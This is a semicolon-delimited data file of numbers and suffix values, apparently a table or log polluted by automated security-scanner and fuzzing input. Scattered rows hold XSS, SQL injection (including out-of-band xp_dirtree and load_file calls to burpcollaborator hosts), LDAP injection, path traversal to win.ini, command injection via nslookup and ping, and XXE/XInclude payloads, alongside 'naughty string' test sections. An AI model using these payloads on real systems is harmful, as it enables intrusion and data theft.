Number;Suffix;
938;#%20%20%20%20%20%20%20Regional%20Indicator%20Symbols;
128;;
938;;
25;NULL;
938;;
26;A;
938;;
1;NULL;
25;NULL;
93;;
12;NULL;
4;NULL;
938;%7b%22count%22%3a999999999999%7d;
19;NULL;
3;NULL;
75;;
938;;
938;;
17;;
938;;
1;NULL;
47;;
9;NULL;
24;NULL;
71;NULL;
75;"%}dj8x2'/""<jk88i";
1;NULL;
62;;
3;NULL;
75;;
3;NULL;
1;;
938;;
247;NULL;
5;;
10;;
938;%7b%22_kind%22%3a%22null%22,%22A%22%3a%22B%22%7d;
3;NULL;
938;PRN;
1;;
1;NULL;
68;NULL;
1;NULL;
5;b;
75;;
938;;
938;ABC%3cdiv%20style%3d%22x%3aexp%5cx00ression(javascript%3aalert(1)%22%3eDEF;
938;١٢٣٤٥٦٧٨٩;
75l2nxr3enus;;
3;;
75;;
2;NULL;
938;;
938;;
85;;
938;%3ca%20href%3d%22%5cx10javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
1;NULL;
126;NULL;
938;;
2;;
17;NULL;
938;;
10;;
8;NULL;
1;NULL;
40;-3;
23;;
234;;
5;NULL;
938;%22%60'%3e%3cscript%3e%5cx0Cjavascript%3aalert(1)%3c%2fscript%3e;
200;;
71;NULL;
75;'+(select*from(select(sleep(20)))a)+';
938;;
18;;
3;NULL;
8;;
938;#;
1;NULL;
12;;
114;C;
45;NULL;
938;;
150;NULL;
938;;
1;;
938;;
938;TRUE;
938;;
938;;
938;0️⃣%201️⃣%202️⃣%203️⃣%204️⃣%205️⃣%206️⃣%207️⃣%208️⃣%209️⃣%20🔟;
8;NULL;
39;NULL;
1;NULL;
16;;
9;NULL;
24;NULL;
23;C;
20;;
938;;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cx80javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
7;A;
938;;
4;;
22;;
5;a;
109;;
938;;
23;;
39;NULL;
68;;
75;;
60;;
938;;
938;;
938;;
938;;
22;NULL;
1;NULL;
501;;
938;;
83;NULL;
102;;
3;NULL;
938;;
24;NULL;
39;NULL;
938;;
75;;
20;NULL;
5;NULL;
75;;
19;NULL;
938;$HOME;
1;NULL;
17;NULL;
26;A;
91;;
938;;
83;NULL;
938;;
938;;
1;NULL;
32;;
71;NULL;
1;NULL;
0;;
938;;
47;;
501;NULL;
71;NULL;
938;;
68;;
68;NULL;
3;T;
34;a;
938;#;Strings%20which%20crashed%20iMessage%20in%20various%20versions%20of%20iOS
24;NULL;
938;%%2a%2e%2as;
358;;
938;;
115;;
1ads5w2bgxÁoultm733c2;;
938;;
39;NULL;
39;NULL;
124;;
938;;
938;;
26;A;
938;;
24;NULL;
212;NULL;
80;;
1;;
75;;
3;NULL;
75|nslookup -q=cname qvp05m9odf8mzb4yu1d96blqehkb82wykq7hv6.burpcollaborator.net.&;;
9;NULL;
938;;
938;%22%5c%22%5c%5c%2fDate(1335205592410)%5c%5c%2f%5c%22%22;
14;;
19;NULL;
247;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
2;NULL;
25;NULL;
15;;
4;NULL;
938;;
938;;
247;NULL;
15;;
1;NULL;
10;NULL;
938;;
3;NULL;
938;#;
501;NULL;
71;NULL;
60;;
13;NULL;
1;NULL;
938;classic;
68;;
938;;
17;NULL;
27;;
150;NULL;
8;NULL;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx84expression(javascript%3aalert(1)%22%3eDEF;
75>;;
BCC:7s0h2365aw53ws1friaq3si7byhs5jtbnzfm6av@burpcollaborator.net;;
zjd: n;;
236;;
938;;
1;NULL;
938;;
1;;
25;NULL;
9;NULL;
1;;
26;A;
3;NULL;
17;NULL;
89;1;
3;NULL;
20;NULL;
80;NULL;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cx8Ajavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;;
938;;
71;NULL;
23;NULL;
938;;
25;NULL;
10;;
22;a;
938;;
1;NULL;
75;;
11;;
71;NULL;
19;;
24;NULL;
2;NULL;
71;NULL;
26;A;
71;NULL;
27;;
39;NULL;
83;NULL;
15;;
938;;
75;;
6;NULL;
938;;
22;A;
1;;
938;;
1;;
17;;
938;;
938;;
71;NULL;
938;;
68;NULL;
75;;
2;NULL;
71;NULL;
11;;
1;NULL;
57;;
7;;
1;NULL;
938;;
938;;
4;;
938;;
80;NULL;
938;;
1;NULL;
8;NULL;
24;NULL;
9;NULL;
68;NULL;
75 and 9545=09545;;
938;;
9;NULL;
71;NULL;
938;;
9;NULL;
71;NULL;
938;;
938;%3cimg%20src%3dx%5cx11onerror%3d%22javascript%3aalert(1)%22%3e;
25;NULL;
938;;
68;NULL;
45;D;
938;;
938;;
938;#;iOS%20Vulnerabilities
938;;
17;NULL;
39;NULL;
114;A;
26;A;
20;NULL;
71;NULL;
3;NULL;
83;NULL;
9;;
938;;
26;A;
938;;
938;;
39;NULL;
17;NULL;
25;NULL;
9;NULL;
9;NULL;
12;NULL;
26;A;
938;;
938;;
45;NULL;
128;;
1;NULL;
0;;
8;NULL;
75;;
3;;
"75;declare @q varchar(99);set @q='\\8gpiq4u6yxt4ktpgfjyrrt68zz5ttkhb7zzmqaf.burpcollab'+'orator.net\hpa'; exec master.dbo.xp_dirtree @q;-- ";;
938;;
938;;
71;NULL;
14;;
26;A;
68;;
1;B;
17;NULL;
20;NULL;
938;;
25;NULL;
1;NULL;
5;NULL;
938;;
938;;
200;;
75;././address;
7;A;
39;NULL;
938;;
75;;
30;NULL;
938;;
5;;
1;;
75;;
47;;
1;NULL;
1;;
71;NULL;
24;NULL;
938;;
83;NULL;
1;NULL;
7564006078 or 1429=1429;;
938;%7b%22%3atest%22%3a%221%22%7d;
45;NULL;
99;;
24;NULL;
34;a;
25;NULL;
24;NULL;
3;NULL;
7;A;
5;a;
22;NULL;
938;;
3;NULL;
938;;
938;;
75;;
44;;
19;NULL;
938;;
75;*)(objectClass=*;
27;;
39;NULL;
5;NULL;
0;;
938;;
12;NULL;
31;NULL;
38;de Heun 38;
10;;
8;;
8;NULL;
938;;
15;;
19;NULL;
4;NULL;
938;;
938;;
45;NULL;
45;NULL;
194;;
1;NULL;
938;;
938;;
75;;
938;;
938;%;
3;NULL;
11;NULL;
938;;
24;NULL;
1;NULL;
71;NULL;
501;NULL;
1;NULL;
13;NULL;
938;;
938;;
88;C;
938;;
938;;
68;NULL;
10;;
68;NULL;
938;;
938;;
75;;
938;;
75;"|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1";
71;NULL;
938;;
21;;
24;NULL;
39;NULL;
938;;
116;;
65;NULL;
1;NULL;
1;;
938;%3ca%20href%3d%22%5cx06javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;%3ca%20href%3d%22%5cx0Ajavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
80;NULL;
75;;
BCC:gn7qxc1e550cr1womr5zy1dg67c10sokh89v0jp@burpcollaborator.net;;
erq: q;;
2;NULL;
25;NULL;
34;a;
11;;
75;;
1;NULL;
24;NULL;
17;NULL;
1;NULL;
15;NULL;
5;NULL;
501;NULL;
17;NULL;
75;;
938;;
75;;
50;;
938;%22%22;
75;;
32;;
938;;
20;;
938;ZZ%3a;
2;NULL;
4;NULL;
24;NULL;
20;NULL;
4;NULL;
68;;
45;NULL;
200;;
39;NULL;
938;#;Terminal%20escape%20codes
938;;
938;$USER;
75;do8d8ga054)(objectClass=*;
20;NULL;
39;NULL;
6;;
39;NULL;
34;a;
938;%7b%22cls%22%3a%22null%22,%22A%22%3a%22B%22%7d;
68;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;2%2e2250738585072011e-308;
12;;
8;;
938;;
39;NULL;
19;;
2;NULL;
24;NULL;
12;NULL;
938;;
39;NULL;
938;;
7568961057' or '4832'='4832;;
45;NULL;
17;;
938;;
39;NULL;
243;2;
938;;
15;;
33;;
26;A;
938;;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE3%5cx80%5cx80expression(javascript%3aalert(1)%22%3eDEF;
5;;
938;%3ca%20href%3d%22%5cx20javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
39;NULL;
1;NULL;
75;;
4;NULL;
938;%22''''%22'%22;
938;;
938;;
7;A;
75;..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini;
1;NULL;
7;A;
3;;
8;NULL;
5;B01;
9;NULL;
150;;
75;;
20;NULL;
938;%222012-04-23T18%3a25%3a43%2e511Z%22;
14;;
80;NULL;
75;;
71;NULL;
3;NULL;
4;;
75;;
40;NULL;
3;NULL;
60;NULL;
25;A;
5;;
4;NULL;
938;;
24;NULL;
7;A;
501;;
938;;
80;;
3;;
71;NULL;
39;NULL;
20;;
938;;
4;NULL;
39;NULL;
71;NULL;
31;;
938;;
19;NULL;
938;;
938;#;Emoji
938;;
938;;
22;a;
938;;
71;NULL;
5;NULL;
24;NULL;
22;NULL;
22;NULL;
1;NULL;
938;;
25;NULL;
3;NULL;
938;;
115;;
24;NULL;
1;NULL;
34;a;
938;;
83;NULL;
938;;
938;;
17;NULL;
34;a;
34;a;
116;;
20;a;
3;NULL;
938;%3cimg%20src%3dx%20onerror%3d%5cx10%22javascript%3aalert(1)%22%3e;
938;;
24;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;;
938;'%3e%3cscript%3ealert(123)%3b%3c%2fscript%20x%3d';
1;NULL;
938;;
24;NULL;
71;NULL;
71;NULL;
938;;
1;NULL;
22;A;
25;NULL;
24;NULL;
75 and 5948=5954;;
22;NULL;
938;;
938;;
34;a;
65;NULL;
24;NULL;
21;;
938;1'000'000,00;
71;NULL;
23;C;
3;NULL;
135;B01;
9;NULL;
22;;
24;NULL;
150;;
170;;
3;;
1;D;
938;;
75;;
938;%7b%22__className%22%3a%22null%22,%22A%22%3a%22B%22%7d;
10;;
20;NULL;
4;NULL;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx81%5cx9Fjavascript%3aalert(1)%3c%2fscript%3e;
938;;
3;NULL;
1;NULL;
938;;
938;;
23;C;
938;;
24;NULL;
60;;
116;;
71;NULL;
26;A;
28;;
1;NULL;
75;;
938;;
4;;
45;NULL;
24;NULL;
14;A;
150;NULL;
14;;
938;%3ca%20href%3d%22%5cx04javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
25;;
26;A;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx8Bjavascript%3aalert(1)%3c%2fscript%3e;
20;NULL;
20;;
75;..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini;
938;;
68;NULL;
4;NULL;
71;NULL;
2;NULL;
236;;
938;;
938;;
3;;
938;;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx89expression(javascript%3aalert(1)%22%3eDEF;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cx83javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
41;;
1;;
10;;
4;NULL;
80;NULL;
45;D;
68;NULL;
75;;
1;NULL;
75;;
4;1;
938;;
9;NULL;
24;NULL;
75;;
39;NULL;
938;;
13;;
938;%7b%22%5cx00%22%3a%22%22%7d;
4;NULL;
45;NULL;
31;;
938;;
68;NULL;
39;NULL;
"759p14jbo5iz&#65;0chneexqs2";;
71;NULL;
938;;
938;;
938;COM2;
938;;
71;NULL;
15;;
3;NULL;
501;;
71;NULL;
141;NULL;
17;NULL;
4;NULL;
68;NULL;
938;;
10;;
14;;
75;"'""`0&nslookup -q=cname as6k2668az56wv1irlat3viab1hv5mtjhb43ss.burpcollaborator.net.&`'";
75;;
17;NULL;
119;;
938;;
75;;
17;NULL;
938;%7b%22$where%22%3a%221%3d%3d1%22%7d;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx8Aexpression(javascript%3aalert(1)%22%3eDEF;
16;;
SkTcFTZCBKgP6A6QOUVcwWCCgYIP4rJPHlIzreavHdU=;;
938;;
938;;
1;;
71;NULL;
938;;
938;;
27;;
938;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
43;NULL;
2;NULL;
19;NULL;
19;NULL;
938;;
71;NULL;
9;NULL;
17;NULL;
26;A;
1;;
1;NULL;
1;NULL;
75;;
938;;
9;NULL;
938;;
938;%3cIMG%20SRC%3d%22jav%26#x0D%3bascript%3aalert('XSS')%3b%22%3e;
83;;
39;NULL;
4;NULL;
68;NULL;
20;NULL;
938;;
938;;
17;NULL;
938;;
17;NULL;
7;A;
1;NULL;
75;;
501;NULL;
1;NULL;
80;NULL;
68;NULL;
938;;
39;NULL;
71;NULL;
91;;
71;NULL;
34;a;
34;a;
39;NULL;
19;NULL;
938;;
8;;
25;NULL;
938;;
111;;
9;NULL;
1;;
1184;;
71;NULL;
5;;
938;,;
938;;
1;NULL;
19;NULL;
22;A;
68;NULL;
75;;
39;NULL;
49;49;
9;NULL;
75;y3ckicc9uf)(!(!(!(objectClass=*)));
80;NULL;
212;NULL;
5;;
83;NULL;
24;NULL;
26;A;
75;(select load_file('\\\\6z6g92d4hvc23r8eyhhparp6ixorci092xukm8b.burpcollaborator.net\\zfi'));
75;;
26;A;
39;NULL;
1;NULL;
938;;
938;;
200;;
9;NULL;
39;NULL;
938;;
1;NULL;
938;0xffffffffffffffff;
6;NULL;
1;;
42;;
71;NULL;
39;NULL;
4;NULL;
13;;
3;NULL;
24;NULL;
10;;
83;NULL;
47;;
7;;
3;NULL;
8;;
11;;
1;NULL;
20;;
25;NULL;
22;NULL;
17;NULL;
938;;
75;;
938;;
22;a;
938;%22%5c%22%5c%5c%2fDate(-1)%5c%5c%2f%5c%22%22;
2;NULL;
121;;
68;NULL;
24;NULL;
3;NULL;
5;NULL;
2;NULL;
22;B;
75;...\./...\./...\./...\./...\./...\./...\./...\./...\./...\./windows/win.ini;
2;;
39;NULL;
75;"<kfn xmlns=""http://a.b/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://a.b/ http://9v5j5597dy85zu4hukds6ul9e0ku8lwlkd75vu.burpcollaborator.net/kfn.xsd"">kfn</kfn>";
71;NULL;
938;;
75;;
-1,00E+02;;
10;;
938;http%3a%2f%2fa%2f%%30%30;
938;Super%20Bowl%20XXX;
938;;
24;NULL;
22;a;
2;NULL;
12;NULL;
141;;
938;1%20000%20000%2e00;
8;NULL;
2;NULL;
938;%3ca%20href%3d%22%5cx05javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;;
83;NULL;
39;NULL;
17;NULL;
938;🐵%20🙈%20🙉%20🙊;
13;NULL;
2;NULL;
501;NULL;
1;;
75;;
45;NULL;
75;gad/address;
0;;
938;FALSE;
SyJ3d9TdH8Ycb4hPSGQdArTRIdP9Moywi1Ux/Kzav4o=;;
17;NULL;
1;NULL;
80;NULL;
25;NULL;
938;;
3;T;
938;%3cscript%20src%3d%22%2f%5c%(jscript)s%22%3e%3c%2fscript%3e;
938;;
938;[%22%3atest%22,%20%221%22];
19;NULL;
17;NULL;
938;;
938;;
5;NULL;
3;NULL;
938;%3cimg%20src%5cx00%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
71;NULL;
938;%22%5cu0000%5cu0001%5cu0002%5cu0003%5cu0004%5cu0005%5cu0006%5cu0007%5cu0008%5cu0009%5cu000a%5cu000b%5cu000c%5cu000d%5cu000e%5cu000f%5cu0010%5cu0011%5cu0012%5cu0013%5cu0014%5cu0015%5cu0016%5cu0017%5cu0018%5cu0019%5cu001a%5cu001b%5cu001c%5cu001d%5cu001e%5cu001f%5cu0020%5cu0021%5cu0022%5cu0023%5cu0024%5cu0025%5cu0026%5cu0027%5cu0028%5cu0029%5cu002a%5cu002b%5cu002c%5cu002d%5cu002e%5cu002f%5cu0030%5cu0031%5cu0032%5cu0033%5cu0034%5cu0035%5cu0036%5cu0037%5cu0038%5cu0039%5cu003a%5cu003b%5cu003c%5cu003d%5cu003e%5cu003f%5cu0040%5cu0041%5cu0042%5cu0043%5cu0044%5cu0045%5cu0046%5cu0047%5cu0048%5cu0049%5cu004a%5cu004b%5cu004c%5cu004d%5cu004e%5cu004f%5cu0050%5cu0051%5cu0052%5cu0053%5cu0054%5cu0055%5cu0056%5cu0057%5cu0058%5cu0059%5cu005a%5cu005b%5cu005c%5cu005d%5cu005e%5cu005f%5cu0060%5cu0061%5cu0062%5cu0063%5cu0064%5cu0065%5cu0066%5cu0067%5cu0068%5cu0069%5cu006a%5cu006b%5cu006c%5cu006d%5cu006e%5cu006f%5cu0070%5cu0071%5cu0072%5cu0073%5cu0074%5cu0075%5cu0076%5cu0077%5cu0078%5cu0079%5cu007a%5cu007b%5cu007c%5cu007d%5cu007e%5cu007f%5cu0080%5cu0081%5cu0082%5cu0083%5cu0084%5cu0085%5cu0086%5cu0087%5cu0088%5cu0089%5cu008a%5cu008b%5cu008c%5cu008d%5cu008e%5cu008f%5cu0090%5cu0091%5cu0092%5cu0093%5cu0094%5cu0095%5cu0096%5cu0097%5cu0098%5cu0099%5cu009a%5cu009b%5cu009c%5cu009d%5cu009e%5cu009f%5cu00a0%5cu00a1%5cu00a2%5cu00a3%5cu00a4%5cu00a5%5cu00a6%5cu00a7%5cu00a8%5cu00a9%5cu00aa%5cu00ab%5cu00ac%5cu00ad%5cu00ae%5cu00af%5cu00b0%5cu00b1%5cu00b2%5cu00b3%5cu00b4%5cu00b5%5cu00b6%5cu00b7%5cu00b8%5cu00b9%5cu00ba%5cu00bb%5cu00bc%5cu00bd%5cu00be%5cu00bf%5cu00c0%5cu00c1%5cu00c2%5cu00c3%5cu00c4%5cu00c5%5cu00c6%5cu00c7%5cu00c8%5cu00c9%5cu00ca%5cu00cb%5cu00cc%5cu00cd%5cu00ce%5cu00cf%5cu00d0%5cu00d1%5cu00d2%5cu00d3%5cu00d4%5cu00d5%5cu00d6%5cu00d7%5cu00d8%5cu00d9%5cu00da%5cu00db%5cu00dc%5cu00dd%5cu00de%5cu00df%5cu00e0%5cu00e1%5cu00e2%5cu00e3%5cu00e4%5cu00e5%5cu00e6%5cu00e7%5cu00e8%5cu00e9%5cu00ea%5cu00eb%5cu00ec%5cu00ed%5cu00ee%5cu00ef%5cu00f0%5cu00f1%5cu00f2%5cu00f3%5cu00f4%5cu00f5%5cu00f6%5cu00f7%5cu00f8%5cu00f9%5cu00fa%5cu00fb%5cu00fc%5cu00fd%5cu00fe%5cu00ff%22;
1;NULL;
101;b;
39;NULL;
10;;
8;;
247;NULL;
71;NULL;
14;;
26;A;
63;;
39;NULL;
24;NULL;
14;;
71;NULL;
1HNeOiZeFu7gP1lxi5tdAwGcB9i2xR+Q2jpmbuwTqzU=;;
1;NULL;
3;NULL;
20;NULL;
938;;
17;NULL;
9;4;
3;;
938;;
7;A;
1;NULL;
88;A;
938;;
71;NULL;
938;;
75;;
8;NULL;
938;%3cfoo%20val%3d“bar”%20%2f%3e;
14;;
938;;
3;NULL;
938;%3cimg%20src%5cx32%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
2;;
67;;
3;NULL;
6;;
68;NULL;
62;A;
938;%7b%22length%22%3a999999999999%7d;
3;NULL;
938;;
938;;
938;;
31;;
75;;
39;NULL;
25;NULL;
0;;
26;A;
26;A;
26;A;
2;NULL;
80;NULL;
20;NULL;
938;;
9;NULL;
10;;
938;%3ctitle%20onpropertychange%3djavascript%3aalert(1)%3e%3c%2ftitle%3e%3ctitle%20title%3d%3e;
938;;
25;NULL;
6;;
80;NULL;
203;;
61;A;
247;NULL;
75;;
"i5ww00b46r&#65;yh4mzd7jz1";;
938;;
1;;
938;;
2;NULL;
24;3;
1;NULL;
20;NULL;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cx88javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
4;NULL;
938;;
11;;
71;NULL;
13;NULL;
938;;
938;%3cfoo%20val%3d”bar“%20%2f%3e;
3;NULL;
8;;
938;;
17;NULL;
938;;
236;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;1;
32;NULL;
4;;
938;%3cscript%5cx20type%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e;
938;;
938;%3cimg%20%5cx00src%3dx%20onerror%3d%22alert(1)%22%3e;
9;NULL;
938;;
75;z78c1${242*358}ah9xy;
75;;
938;;
938;;
71;NULL;
10;;
32;;
501;NULL;
150;NULL;
26;A;
1;NULL;
938;%3c%3c%3c%20%s(un%3d'%s')%20%3d%20%u;
112;;
60;;
68;NULL;
39;NULL;
3;;
75;;
4;NULL;
19;NULL;
1;NULL;
75;"';declare @q varchar(99);set @q='\\547fe1i3muh18qdd3gmofqu5nwtqhh58wwojg75.burpcollab'+'orator.net\hgd'; exec master.dbo.xp_dirtree @q;-- ";
4;NULL;
75;.../;
20;NULL;
1;NULL;
938;;
4;NULL;
25;NULL;
938;;
65;NULL;
32;;
39;NULL;
938;;
39;NULL;
3;NULL;
83;NULL;
150;;
8;NULL;
8;NULL;
1;NULL;
9;;
1;;
22;NULL;
1;NULL;
3;NULL;
938;;
45;NULL;
3;NULL;
938;;
4;;
39;NULL;
938;;
83;NULL;
26;A;
938;;
17;NULL;
75;;
16;;
938;;
938;CON;
22;NULL;
938;;
75;;
1;;
80;NULL;
26;A;
75;;
34;a;
938;'%20OR%201%3d1%20--%201;
83;NULL;
39;NULL;
4;NULL;
19;NULL;
938;;
75;;
4;NULL;
938;;
938;;
3;;
50;;
1;NULL;
938;%5c%5c;
150;;
938;%22%60'%3e%3cscript%3e%5cxEF%5cxBB%5cxBFjavascript%3aalert(1)%3c%2fscript%3e;
53;;
6;;
938;;
84;A;
200;;
22%;;
75;;
938;#;
71;NULL;
938;;
938;;
68;NULL;
938;;
4;NULL;
4;NULL;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx81expression(javascript%3aalert(1)%22%3eDEF;
200;;
39;NULL;
68;NULL;
938;;
2;NULL;
938;;
79;a;
938;;
75' and 2525=2525-- ;;
938;;
107;B;
50;;
247;NULL;
4;NULL;
83;NULL;
65;NULL;
24;NULL;
938;;
5;;
25;NULL;
26;A;
4;NULL;
7;;
11;;
938;%3ca%20href%3d%22%5cx12javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
17;NULL;
9;;
24;NULL;
1;NULL;
938;;
7;;
1;NULL;
3;;
91;;
25;NULL;
71;NULL;
1;NULL;
938;;
0;;
938;;
75;;
17;NULL;
65;NULL;
75;;
24;NULL;
938;#;Strings%20which%20contain%20unicode%20with%20unusual%20properties%20(e%2eg%2e%20Right-to-left%20override)%20(c%2ef%2e%20http%3a%2f%2fwww%2eunicode%2eorg%2fcharts%2fPDF%2fU2000%2epdf)
71;NULL;
1;NULL;
938;;
47;;
3;NULL;
1;NULL;
10;;
75;;
41;NULL;
938;𝐓𝐡𝐞%20𝐪𝐮𝐢𝐜𝐤%20𝐛𝐫𝐨𝐰𝐧%20𝐟𝐨𝐱%20𝐣𝐮𝐦𝐩𝐬%20𝐨𝐯𝐞𝐫%20𝐭𝐡𝐞%20𝐥𝐚𝐳𝐲%20𝐝𝐨𝐠;
19;NULL;
138;;
938;1#IND;
9;;
3;NULL;
45;NULL;
256;NULL;
4;NULL;
938;;
938;;
1;NULL;
1;;
1;NULL;
938;;
5;;
3;NULL;
14;A;
3;NULL;
3;NULL;
39;NULL;
75;*)(!(!(!(objectClass=*)));
3;NULL;
938;;
75;;
14;;
938;;
30;;
19;NULL;
10;NULL;
10;;
75;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;;
938;;
150;NULL;
17;NULL;
25;NULL;
10;;
10;;
10;NULL;
1;NULL;
938;;
938;;
71;NULL;
75;;
75;';
6;NULL;
938;;
17;NULL;
938;;
938;;
938;;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx85expression(javascript%3aalert(1)%22%3eDEF;
13;;
19;;
938;;
8;NULL;
17;NULL;
12;;
80;NULL;
75;53163014' or 7294=7294-- ;
24;NULL;
3;;
9;4;
39;;
25;NULL;
3;;
938;%3cIMG%20SRC%3d#%20onmouseover%3d%22alert('xxs')%22%3e;
68;NULL;
26;A;
12;;
25;NULL;
3;;
938;;
938;;
938;;
7;A;
938;;
200;;
25;NULL;
3;NULL;
17;NULL;
43;NULL;
12;;
2;NULL;
100;;
938;;
938;;
17;NULL;
938;;
938;;
54;;
938;;
938;;
938;;
34;a;
24;NULL;
75;;
45;A;
34;a;
938;;
75;;
71;NULL;
247;NULL;
7;a;
7;A;
22;a;
17;NULL;
18;;
19;NULL;
243;2;
24;NULL;
40;NULL;
938;;
83;NULL;
6;;
34;NULL;
75;;
501;NULL;
938;;
938;;
938;;
1;NULL;
75;;
938;;
938;Tyson%20Gay;
65;NULL;
116;;
75;9ygyduzoe2)(!(!(objectClass=*));
938;;
2;NULL;
938;;
938;;
8;;
938;;
9;NULL;
938;;
150;NULL;
71;NULL;
80;NULL;
938;;
71;NULL;
39;NULL;
938;;
938;;
17;NULL;
9;NULL;
80;NULL;
8;Skûtmakker;
45;NULL;
39;NULL;
75;"ke5cc%>qsqc1'/""<u087z";
938;;
45;NULL;
938;;
27;A;
68;NULL;
3;NULL;
22;NULL;
938;;
938;;
4;;
7;A;
75;;
938;-9223372036854775808%2f-1;
80;NULL;
33;;
19;NULL;
938;;
34;;
5;;
938;;
425;;
80;NULL;
3;NULL;
4;NULL;
33;;
19;NULL;
10;;
25;NULL;
17;NULL;
99;;
75;;
15;NULL;
17;NULL;
938;;
26;A;
3;NULL;
3;NULL;
3;NULL;
150;NULL;
938;;
45;NULL;
50;;
17;NULL;
"<kye xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://x977jtnvrmmtdii588rgkizxsoyim9aay2lt9i.burpcollaborator.net/foo""/></kye>";;
44;;
938;;
4;;
10;;
13;;
938;;
39;NULL;
17;NULL;
71;NULL;
247;NULL;
938;;
3;NULL;
4;NULL;
"75&nslookup -q=cname 9dnjn5r7vyq5humhckvsou39w02uqleg28pzdo.burpcollaborator.net.&'\""`0&nslookup -q=cname 9dnjn5r7vyq5humhckvsou39w02uqleg28pzdo.burpcollaborator.net.&`'";;
1;D;
25;NULL;
26;A;
938;;
17;NULL;
4;NULL;
39;NULL;
938;--;
247;NULL;
45;NULL;
80;NULL;
150;NULL;
1;NULL;
68;;
4;;
2;d;
1;;
66;;
71;NULL;
18;;
938;%60%22'%3e%3cimg%20src%3dxxx%3ax%20%5cx0Donerror%3djavascript%3aalert(1)%3e;
79;;
10;;
1;NULL;
26;;
938;;
13;;
39;NULL;
88;A;
2;NULL;
75;;
938;;
1;NULL;
68;NULL;
71;NULL;
3;NULL;
14;;
75;;
71;NULL;
71;NULL;
1;NULL;
34;a;
17;NULL;
71;;
58;;
71;NULL;
83;NULL;
8;NULL;
938;;
8;;
43;NULL;
938;;
68;NULL;
19;NULL;
9;;
75;;
938;;
938;;
7;;
39;NULL;
